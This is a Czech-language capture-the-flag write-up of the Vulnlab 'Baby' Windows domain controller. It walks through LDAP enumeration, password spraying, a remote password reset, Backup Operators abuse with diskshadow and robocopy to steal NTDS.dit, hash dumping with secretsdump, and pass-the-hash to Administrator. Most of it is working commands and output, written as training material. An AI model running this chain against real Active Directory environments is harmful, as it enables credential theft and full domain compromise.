+++
title = "Vulnlab - Baby (Easy)"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["Vulnlab", "Pentesting", "Windows", "ActiveDirectory"]
keywords = ["", ""]
description = ""
showFullContent = false
readingTime = false
hideComments = false
+++

## Informace o stroji

- **Název:** Baby
- **Platforma:** Vulnlab
- **Úroveň obtížnosti:** Easy
- **OS:** Windows Server
- **IP:** 10.10.118.21
- **Popis:** Tato mašina zahrnuje enumeraci **LDAP** v prostředí **Active Directory**, **password spraying** a eskalaci práv pomocí **Pass-the-Hash** útoku. Tohle CTF se mi obzvlášť líbilo, protože server měl aktivní antivirus, což simulovalo reálné prostředí. Mimo to také obsahoval zranitelnosti, se kterými se profesionálové podle jejich slov skutečně setkali v praxi.

---

## Rustscan - průzkum otevřených portů

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ rustscan -a 10.10.118.21 -- -sV
```

```
Open 10.10.118.21:53
Open 10.10.118.21:88
Open 10.10.118.21:135
Open 10.10.118.21:139
Open 10.10.118.21:389
Open 10.10.118.21:445
Open 10.10.118.21:464
Open 10.10.118.21:593
Open 10.10.118.21:636
Open 10.10.118.21:3269
Open 10.10.118.21:3268
Open 10.10.118.21:3389
Open 10.10.118.21:5357
Open 10.10.118.21:5985
Open 10.10.118.21:9389
Open 10.10.118.21:49664
Open 10.10.118.21:49667
Open 10.10.118.21:49668
Open 10.10.118.21:49674
Open 10.10.118.21:49675
Open 10.10.118.21:50798
Open 10.10.118.21:51421

[~] Starting Script(s)

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-01 17:17:06Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50798/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51421/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```


---

## Identifikace OS a průzkum prostředí
Po dokončení skenování lze usoudit, že se jedná nejspíš o **Doménový řadič v AD síti**. Jsou totiž otevřené porty jako např. 53 (DNS), 389 (LDAP), 464 (Kerberos), 636 (LDAPS) a plno portů pro RPC. Tohle je dobré znamení, že jde právě o **AD DC**. To si můžeme také potvrdit pomocí nástroje `netexec`, který nám poskytne více informací o systému a prostředí:

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ nxc smb 10.10.118.21                                                             
SMB         10.10.118.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
```
Z výsledku jde vidět, že název serveru je `BABYDC`, operační systém je `Windows Server 2022`, doména je `baby.vl` a SMB Signing je nastaven na `True`, což je u doménových řadičů obvyklé, defaultní nastavení.

V reálném prostředí, kde bychom testovali AD síť bychom mohli využít nástroje jako responder, ntlmrelayx a nebo třeba mitm6. Tohle je při interních penetračních testech běžná praktika, ovšem o tomhle CTF víme, že jde o samostatné zařízení, takže bychom pomocí těchto nástrojů pravděpodobně ničeho nedosáhli, protože tyto nástroje spoléhají na síťové události, které nastávají při běžné komunikaci v síti.

Co ale rozhodně můžeme testovat jsou např. služby jako `SMB`, `LDAP`, `Kerberos` a `RDP`. Pojďme se tedy zaměřit na SMB službu jako první. Při testování SMB služby v AD prostředí mě jako první napadá vyzkoušet SMB Null Session login, který spočívá v tom, že se zkusíme k SMB službě připojit bez přihlašovacího jména a hesla.

---

## Průzkum SMB

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ nxc smb 10.10.118.21 -u '' -p ''        
SMB         10.10.118.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.118.21    445    BABYDC           [+] baby.vl\:
```

Vidíme, že je možné přihlásit se s prázdným jménem a heslem (znak `+`). Otázkou ale je, jestli toho můžeme nějak využít a jestli jsme schopni pomocí tohoto získat nějaké dodatečné infromace o systému. Zkusíme tedy například získat informace o uživatelích domény:

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ nxc smb 10.10.118.21 -u '' -p '' -d baby.vl --users
SMB         10.10.118.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.118.21    445    BABYDC           [+] baby.vl\:
```

A máme smůlu, nic jsme nezískali. Mohli bychom zkusit získat informace také např. o sdílených složkách nebo bychom se mohli zkusit přihlásit jako uživatel Guest, ale prozradím vám, že ani tohle při testování nikam nevedlo. Nástroje jako smbclient a enum4linux nezobrazily žádné informace, které by mohly vést k exploitaci. Přesuneme se tedy k prozkoumávání LDAP služby. LDAP služba se v AD síti používá pro spravování a dotazování objektů (počítače, uživatelé, skupiny, atd.). Pro prozkoumání této služby můžeme využít nástrojů jako např. `ldapsearch`, `ldapdomaindump` a nebo právě také `netexec`, což je má oblíbená volba, díky své jednoduchosti.

Zkusme tedy otestovat `LDAP` službu tím, že se k ní zkusíme přihlásit anonymně (bez jména a hesla).

---

## Průzkum LDAP

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ nxc ldap 10.10.118.21 -u '' -p '' -d baby.vl    
LDAP        10.10.118.21    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.118.21    389    BABYDC           [+] baby.vl\:
```

Vidíme, že nám bylo přihlášení povoleno, ale setkáváme se zde se stejnou otázkou jako v případě testování SMB. Můžeme toto anonymní přihlášení využít k získání dodatečných informací? Zkusme například získat informace o doménových uživatelích:

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ nxc ldap 10.10.118.21 -u '' -p '' -d baby.vl --users
LDAP        10.10.118.21    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.10.118.21    389    BABYDC           [+] baby.vl\: 
LDAP        10.10.118.21    389    BABYDC           [*] Total records returned: 39
LDAP        10.10.118.21    389    BABYDC           DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Administrator,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Guest,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=krbtgt,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Domain Computers,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Schema Admins,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Cert Publishers,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Domain Admins,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Domain Users,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Domain Guests,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Protected Users,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Key Admins,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=DnsAdmins,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=dev,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Hugh George,OU=dev,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Ian Walker,OU=dev,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=it,CN=Users,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP        10.10.118.21    389    BABYDC           CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

Výborně, získali jsme informace o uživatelích a jejich organizačních jednotkách (OU). Máme také přehled o skupinách. Pojďme prozkoumat tuto službu hlouběji a zkusme získat například informace o popisu uživatelů. V praxi je celkem časté, že tyto popisy obsahují nějaké citlivé informace. Administrátoři si totiž myslí, že popisy uživatelů nikdo krom nich neuvidí, což jak brzy uvidíme, není pravda. K tomu použijeme modul `get-desc-users`.

```bash
 ┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ sudo nxc ldap 10.10.118.21 -u '' -p '' -d baby.vl -M get-desc-users
[sudo] password for kali: 
SMB         10.10.118.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
LDAP        10.10.118.21    389    BABYDC           [+] baby.vl\: 
GET-DESC... 10.10.118.21    389    BABYDC           [+] Found following users: 
GET-DESC... 10.10.118.21    389    BABYDC           User: Guest description: Built-in account for guest access to the computer/domain
GET-DESC... 10.10.118.21    389    BABYDC           User: Teresa.Bell description: Set initial password to BabyStart123!

```

Zajímavé, účet `Teresa.Bell` má v popise uvedeno heslo. Z předchozích informací víme, že Teresa.Bell je účet nejspíš IT oddělení. To může znamenat, že tohle heslo IT oddělení používá např. při vytváření nového uživatele. Každému novému uživateli přiřadí prvotní heslo `BabyStart123!` a tento uživatel si jej po přihlášení musí změnit. No jo, ale jak tohle otestujeme? Odpověď je provedením password spraying útoku. K tomuto útoku použijeme opět nástroj netexec. Je to velmi mocný nástroj, pomocí kterého se dá hacknout celá AD síť. 

---

## Password Spraying

Pro password spraying útok potřebujeme seznam uživatelů v souboru a heslo, které už máme. Z předešlé informace víme, že formát uživatelského jména je nejspíš ve tvaru `jméno.příjmení`.  Z dříve získaného seznamu uživatelů můžeme tedy vytvořit nový seznam uživatelů ve správném formátu pomocí následujícího bash one-lineru:

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ sudo nxc ldap 10.10.118.21 -u '' -p '' -d baby.vl --users | awk -F '=' '{print $2}' | sed 's/ /./g' | awk -F ',' '{print $1}' > users.txt
```

Tento soubor ale obsahuje také prázdné řádky, odstraníme je tedy příkazem:

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ sed -E '/^$/d' users.txt > users_filtered.txt
```

Výborně, náš soubor **users_filtered.txt** se všemi doménovými uživateli je připraven k útoku. Útok spustíme takto:

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ sudo nxc ldap 10.10.118.21 -u 'users_filtered.txt' -p 'BabyStart123!'                                                                    
SMB         10.10.118.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\baby:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Administrator:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Guest:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\krbtgt:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
LDAP        10.10.118.21    389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

Vidíme, že u mnoha účtů toto heslo není správné, ale u posledního řádku se výstup liší. Dostáváme informaci `STATUS_PASSWORD_MUST_CHANGE`, což indikuje přesně ten scénář, který jsem popisoval dříve. Účtu `Caroline.Robinson` pravděpodobně od jeho založení nebylo změněno heslo a systém nám říká, že je potřeba jej změnit. Dokud toto heslo není změněno, nelze se k účtu přihlásit. Otázkou teď je, jestli jsme toto heslo schopni změnit a aktivovat vzdáleně? Odpověď je samozřejmě ANO. Toho dosáhneme pomocí nástroje `smbpasswd`.

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ sudo smbpasswd -U caroline.robinson -r 10.10.118.21                  
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user caroline.robinson on 10.10.118.21.
```

Zadávání hesla zde sice není vidět, ale původní heslo **BabyStart123!** bylo změněno na **BabyStart1234!**. Můžeme to ověřit pokusem o přihlášení:

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ sudo nxc ldap 10.10.118.21 -u 'caroline.robinson' -p 'BabyStart1234!'
SMB         10.10.118.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
LDAP        10.10.118.21    389    BABYDC           [+] baby.vl\caroline.robinson:BabyStart1234! (Pwn3d!)
```

Výborně, přihlášení jako uživatel **caroline.robinson** je úspěšné.  Nyní vlastníme platný doménový účet, což nám otevírá mnoho možností pro další prozkoumávání a testování. S platným doménovým účtem bychom se například mohli vrátit zpět k průzkumu SMB a zkusit získat například informace o sdílených složkách. Pojďme to tedy otestovat:

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ sudo nxc smb 10.10.118.21 -u 'caroline.robinson' -p 'BabyStart1234!' --shares
SMB         10.10.118.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.118.21    445    BABYDC           [+] baby.vl\caroline.robinson:BabyStart1234! 
SMB         10.10.118.21    445    BABYDC           [*] Enumerated shares
SMB         10.10.118.21    445    BABYDC           Share           Permissions     Remark
SMB         10.10.118.21    445    BABYDC           -----           -----------     ------
SMB         10.10.118.21    445    BABYDC           ADMIN$          READ            Remote Admin
SMB         10.10.118.21    445    BABYDC           C$              READ,WRITE      Default share
SMB         10.10.118.21    445    BABYDC           IPC$            READ            Remote IPC
SMB         10.10.118.21    445    BABYDC           NETLOGON        READ            Logon server share 
SMB         10.10.118.21    445    BABYDC           SYSVOL          READ            Logon server share
```

Vidíme, že jsme úspěšně získali seznam sdílených složek na síti, což by bez platného doménového účtu nebylo možné, jak jsme si ukázali dřív. Problém ale je, že tyto sdílené složky jsou standardní a není tady na první pohled něco, co by vyčnívalo. Tohle tedy prozatím vynecháme. Mohli bychom teď například provést **Kerberoasting útok**, mohli bychom posbírat informace o doméně pomocí nástroje **bloodhound**, mohli bychom zkusit **GPP cPassword attack** a mnoho dalšího, ale pojďme zkusit nejprve to nejjednodušší, přihlásit se pomocí nově získaných údajů k systému s cílem spouštět na něm vzdáleně příkazy. K tomu můžeme využít službu `WinRM`, o které z počátečního skenu víme, že funguje na portu 5985 a tento port je na systému otevřený. WinRM je nástroj od společnosti Microsoft, který umožňuje vzdálenou správu systému přes síť. Na Kali linuxu pro využití této služby existuje nástroj `evil-winrm`.

---

## Exploitace

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ sudo evil-winrm -u caroline.robinson -p 'BabyStart1234!' -i 10.10.118.21 
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami
baby\caroline.robinson
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> hostname
BabyDC
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents>
```

Zde vidíme, že přihlášení proběhlo úspěšně, jsme přihlášení jako uživatel **caroline.robinson** a nacházíme se na systému **BabyDC (Doménovém řadiči AD sítě)**. Jako první bychom se měli trochu rozhlédnout kolem sebe, zjistit, jaká máme práva, zjistit informace o **skupinách**, jejichž jsme součástí, zjistit, jestli můžeme navštěvovat zajímavé složky na systému a také jestli je aktivní nějaká antivirová ochrana. Pokud ale vyzkoušíme příkaz jako **systeminfo** nebo získání informací o **Windows Defenderu** pomocí powershellu, tak zjistíme, že tento účet nemá mnoho oprávnění, co se týká příkazů.

Příkaz pro získání informací o privilegiích ale funguje a právě ten nám prozradí, jaká oprávnění má náš účet a kterých skupin jsme součástí. Pojďme se na něj podívat:

```powershell
*Evil-WinRM* PS C:\Users> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

---

## Eskalace privilegií

Z výsledku příkazu můžeme vidět, že jsme členem několika skupin. Některé skupiny jsou běžné, ovšem jedna z nich vyčnívá a je to právě skupina **Backup Operators**, což je vestavěná skupina v systému Windows. Podle dokumentace členové této skupiny mohou číst soubory a adresáře, ke kterým by normální uživatel neměl přístup. Cílem této skupiny je umožnit jejím členům zálohovat a obnovovat adresáře a soubory bez ohledu na jejich oprávnění. Zajímavé, teď je ale otázkou, jak bychom toho mohli využít?

Pokud se vrátíme zpět k našim poznámkám a uvědomíme si, že se nacházíme na doménovém řadiči, což je srdce domény, tak nás může napadnout, že bychom mohli na systému provést zálohu doménové databáze a tu si potom stáhnout k sobě na Kali Linux. Taková úvaha je správná a jeden takový soubor, který uchovává kritické údaje o všech doménových uživatelích včetně administrátorů se jmenuje `NTDS.dit` a je uložený v `%SystemRoot%\NTDS\Ntds.dit`. Musíme ale brát v potaz, že tento soubor je neustále otevřený a systém s ním pracuje za běhu, takže tradiční stažení souboru nám nebude fungovat, musíme nejprve vytvořit bezpečnou kopii a až tu poté můžeme stáhnout.

K tomu použijeme nástroj `diskshadow`, který je zahrnut nativně ve Windows Serverech. Tento nástroj umožňuje vytvářet záložní snímky a kopie počítačových souborů i když jsou zrovna používány. Po pročtení několika článků o této technologii se dozvíme, že k tomu, abychom úspěšne extrahovali ntds.dit, potřebujeme vlastní **diskshadow skript**, který vytvoří kopii (snapshot) disku **C:** a vystaví ji jako disk **Z:** Obsah skriptu `shadow.txt` bude vypadat takto:

```
set context persistent nowriters
set metadata c:\exfil\metadata.cab
add volume c: alias trophy
create
expose %trophy% z:
```

Předtím, než tento soubor uploadujeme na doménový řadič, musíme se ujistit, že bude kompatibilní s Windows. Musíme tedy zadat příkaz (na Linuxu):

```bash
┌──(kali㉿kali)-[~]
└─$ unix2dos shadow.txt 
unix2dos: converting file shadow.txt to DOS format..
```

Tento nově vytvořený skript shadow.txt nyní přesuneme na doménový řadič pomocí příkazu `upload` v rámci `evil-winrm` utility. Jednoduše řečeno, v říkazovém řádku na vzdáleném DC zadáme následující:

```powershell
*Evil-WinRM* PS C:\Users\caroline.robinson> upload shadow.txt
                                        
Info: Uploading /home/kali/Vulnlab/Baby/shadow.txt to C:\Users\caroline.robinson\shadow.txt                                                         
                                        
Data: 160 bytes of 160 bytes copied
                                        
Info: Upload successful!
```

Nyní tento skript využijeme v příkazu diskshadow na DC:
```powershell
*Evil-WinRM* PS C:\Users\caroline.robinson> mkdir c:\exfil
*Evil-WinRM* PS C:\Users\caroline.robinson> diskshadow /s shadow.txt
The shadow copy was successfully exposed as z:\.
```

Tento příkaz vytvoří kopii disku **C:** jako disk **Z:** a my nyní můžeme soubor **NTDS.dit** z této kopie přesunout zpátky na disk C:\ do námi zvolené složky (např. **Temp**) a soubor bezpečně stáhnout odtud. Klíčem tohoto kroku bylo to, abychom vytvořili kopii **NTDS.dit**, která aktuálně není používaná systémem. Pozor, ke správnému zkopírování souboru potřebujeme použít nástroj `robocopy` a ne standardní copy. To je kvůli tomu, že robocopy umožňuje backup mode, což právě obchází problémy s oprávněním, pokud jsme členem skupiny **Backup Operators**.

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Temp> robocopy /b z:\windows\NTDS\ . ntds.dit
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Temp> download ntds.dit              
Info: Downloading C:\Users\Caroline.Robinson\Temp\ntds.dit to ntds.dit
download successful!
```

Skvěle, soubor jsme úspěšně stáhli na naše kali zařízení. Abychom ale mohli úspěšně získat jeho obsah a zejména kritické údaje o uživatelích, potřebujeme ze systému extrahovat ještě tzv. **SYSTEM HIVE**, který obsahuje klíč k dešifrování **NTDS.dit**, což můžeme udělat takto:

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Temp> reg save HKLM\SYSTEM .\system
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Temp> download system
```

Když teď máme oba soubory stažené na Kali, můžeme dumpnout celou databázi z NTDS.dit souboru následovně:

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ impacket-secretsdump -ntds ntds.dit -system system LOCAL         
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:0cd2b3a4d77ea8fd362110e0cd8d3f10:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5::
```

---

## Pass-The-Hash

Jak vidíme, úspěšně jsme získali údaje o všech doménových uživatelích. Zejména je pro nás zajímavý uživatel `Administrator`, který má neomezená práva. Někdo, kdo nemá tolik zkušeností s penetračním testováním může namítnout, že jsme získali pouze otisky (hash) hesel, ale abychom tyto hesla mohli využít, musíme nejprve tyto hashe cracknout. To tak úplně není pravda. Při autentizaci ve windows se využívají totiž právě tyto hashe, nikoliv clear-text hesla. To nám umožňuje provést tzv. **Pass-the-hash** útok, kdy místo hesla pro přihlášení uvedeme právě uživatelův hash.

Pro našeho získaného uživatele **Administrator** by útok vypadal takto:

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ nxc smb 10.10.118.21 -u 'Administrator' -H 'ee4457ae59f1e3fbd764e33d9cef123d'
SMB         10.10.118.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.118.21    445    BABYDC           [+] baby.vl\Administrator:ee4457ae59f1e3fbd764e33d9cef123d (Pwn3d!)
```

**(Pwn3d!)** znamená, že máme na doménovém řadiči přístup a zároveň administrátorská práva. Pojďme to ověřit tím, že se opět přihlásíme přes WinRM službu k DC, tentokrát jako uživatel **Administrator**.

```bash
┌──(kali㉿kali)-[~/Vulnlab/Baby]
└─$ sudo evil-winrm -u Administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d' -i 10.10.118.21 
                       
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
baby\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Přihlášení pomocí **NTLM** hashe bylo úspěšné.

